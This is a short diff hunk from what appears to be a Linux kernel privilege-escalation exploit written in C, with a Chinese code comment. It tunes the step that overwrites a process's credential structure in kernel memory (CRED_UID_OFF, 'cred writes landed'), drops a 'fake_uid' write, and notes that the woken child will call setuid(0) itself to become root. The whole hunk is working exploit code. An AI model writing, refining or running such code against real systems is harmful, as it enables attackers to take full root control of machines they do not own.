@@ -3409,8 +3409,9 @@ int main(int argc, char **argv)
                             "panic_on_warn", raw, NULL))
                 park_forever("panic_on_warn write failed");
         }
-        if (stage_write(fc.A + CRED_UID_OFF, 0, "fake_uid", raw, NULL))
-            logf("[-] fake_uid best-effort miss; waking child anyway\n");
+        /* 2026-11-25: 跳过 fake_uid。burst miss 会在 run_plant 内直接 park，
+         * best-effort 无效；child 唤醒后会自己 setuid(0) 修 uid（11-22 已验证）。 */
+        logf("[+] fake_uid skipped (child setuid(0) will fix uid)\n");
     }
     logf("[+] cred writes landed, waking child\n");
 
